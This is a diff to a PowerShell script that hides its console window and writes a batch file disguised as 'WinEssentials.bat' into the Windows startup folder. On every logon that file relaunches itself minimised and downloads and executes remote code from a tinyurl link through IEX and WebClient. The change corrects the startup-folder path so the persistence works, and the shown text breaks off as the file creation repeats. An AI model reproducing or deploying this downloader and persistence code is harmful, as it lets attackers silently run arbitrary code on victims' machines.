@@ -8,19 +8,7 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Start" 
-
-New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
-@echo off
-if "%1"=="done" goto runtime
-start "" /min %0 done
-exit
-
-:runtime
-powershell IEX (New-Object System.Net.WebClient).DownloadString('http://tinyurl.com/y44v5ltr')
-"@
-
-cd "C:\ProgramData\Microsoft\Windows\menuen start\Programs\Start" 
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
 
 New-Item -Path . -Name "WinEssentials.bat" -ItemType "file" -Value @"
 @echo off
